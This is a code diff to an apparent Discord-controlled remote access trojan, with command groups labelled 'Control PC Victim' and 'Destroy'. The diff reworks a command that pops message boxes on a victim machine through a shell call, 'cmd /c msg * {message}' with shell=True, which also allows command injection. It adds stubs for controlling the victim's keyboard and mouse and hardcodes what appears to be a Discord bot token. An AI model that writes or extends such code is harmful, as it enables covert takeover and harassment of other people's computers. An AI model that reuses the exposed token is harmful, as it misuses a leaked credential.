@@ -141,26 +141,22 @@ class Control(commands.Cog, description='Control PC Victim'):
 	async def MessageBox(self, ctx, HWID: str, method = 'msg', amount: int = 1, caption: str = 'Lol', *, message):
 		if not CheckHWID(HWID):
 			return
-		def msg():
-			output = str(subprocess.check_output(f'cmd /c msg * {message}', shell=True), 'utf-8')	
-		def msgbox():
-			win32api.MessageBox(win32con.NULL, message, caption)	
-
-		for i in range(amount):
-			if method == 'msg':
-				threading.Thread(target = msg).start()
-			elif method == 'msgbox':
-				threading.Thread(target = msgbox).start()
+		def msg(amount, method, message):
+			for i in range(amount):
+				if method == 'msg':
+					output = str(subprocess.check_output(f'cmd /c msg * {message}', shell=True), 'utf-8')	
+				elif method == 'msgbox':
+					win32api.MessageBox(win32con.NULL, message, caption)	
+		threading.Thread(target = msg, args = (amount, method, message, )).start()
 		await SendOutput(ctx, "Done!")
 
-
-	@commands.command(aliases=["run", "r"], brief='Run File From PC Victim', description='Run File From PC Victim')
-	async def Run(self, ctx, HWID: str, path_file: str = '.',  method = 'cmd', ):
+	@commands.command(aliases=["kboard", "kb"], brief='Control Keyboard PC Victim', description='Control Keyboard PC Victim')
+	async def Keyboard(self, ctx, HWID: str, mode: str = 'type',  *, text = ''):
 		if not CheckHWID(HWID):
 			return
 
-	@commands.command(aliases=["run", "r"], brief='Run File From PC Victim', description='Run File From PC Victim')
-	async def Run(self, ctx, HWID: str, path_file: str = '.',  method = 'cmd', ):
+	@commands.command(aliases=["mouse", "mse"], brief='Control Mouse PC Victim', description='Control Mouse PC Victim')
+	async def Mouse(self, ctx, HWID: str, click_mode: str = 'r',  x = 0, y = 0):
 		if not CheckHWID(HWID):
 			return
 
@@ -192,3 +188,5 @@ async def on_ready():
 	await client.add_cog(Destroy())
 	await client.add_cog(Control())
 	await client.add_cog(OtherCommands())
+
+client.run('MTEyODYxNzQxNTE4MjM4OTM1OA.GNy7c2.0Gl4qgQw-s5lUN7m32lRGKcIMFsTrFclewuhA4')
